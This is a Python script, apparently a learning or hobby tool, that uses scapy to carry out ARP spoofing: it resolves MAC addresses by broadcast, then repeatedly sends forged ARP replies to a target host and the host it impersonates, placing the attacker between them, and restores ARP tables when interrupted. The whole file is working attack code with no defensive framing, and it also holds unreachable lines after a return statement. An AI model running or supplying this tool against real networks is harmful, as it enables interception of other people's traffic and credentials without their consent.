#!/usr/bin/env python3

import scapy.all as sc 
import argparse
import time 

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target_ip', dest='target_ip', help="The target ip .\n")
    parser.add_argument('-s', '--spoof_ip', dest='spoof_ip', help="The ip you want to spoof.\n")
    options  = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] please specify the ip address of the target, use --help for options ")
    elif not options.spoof_ip:
        parser.error("[-] please specify the ip you want to spoof, use --help for options ")
    return options

def get_mac(ip):
    try:
        arp_request = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
        client_list = []
        for elements in answered_list:
            client_dict = {"ip":elements[1].psrc, "mac": elements[1].hwsrc}
            client_list.append(client_dict)
        return client_list
    except PermissionError:
        print("[-] Please run this script as root (use 'sudo' before the running the script)")

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = sc.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=spoof_ip)
	sc.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = sc.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc=source_ip, hwsrc=source_mac)
	sc.send(packet, verbose=False)
	
options = get_arguments()
sent_packets = 0
try:
	while True:
		spoof(options.target_ip,options.spoof_ip)
		spoof(options.spoof_ip,options.target_ip)
		sent_packets += 2
		print(" \r[+] Packets sent : " + str(sent_packets), end='')
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-]Program was interrupted by the user.........")
	print("Quitting.....")
	restore(options.target_ip, options.spoof_ip)
